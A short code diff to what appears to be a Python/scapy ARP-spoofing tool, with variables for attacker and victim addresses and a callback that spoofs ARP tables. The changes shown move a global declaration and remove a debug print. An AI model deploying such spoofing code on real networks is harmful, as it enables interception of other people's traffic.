@@ -13,6 +13,7 @@ arp_looping = False #set this to false to stop the thread
 # MAC address function which will return
 # the mac_address of the provided ip address 
 def get_mac(ip):
+    global router_mac
     if ip == ATTACKER_IP :
         return ATTACKER_MAC
     if ip in victim_addresses:
@@ -34,7 +35,6 @@ def get_mac(ip):
         # we choose the first MAC address and select
         # the MAC address using the field hwsrc
         if ip == router_ip:
-            global router_mac
             router_mac = answ[0][1].hwsrc
         return answ[0][1].hwsrc
     else:
@@ -143,7 +143,6 @@ def arp_silent():
 
 #When an arp request or answer is detected, spoof the arp table, also answer to override it.
 def arp_scout_callback(packet):
-    print("debug")
     if packet[scapy.Ether].src == ATTACKER_MAC:
         return
     if packet.haslayer(scapy.ARP):
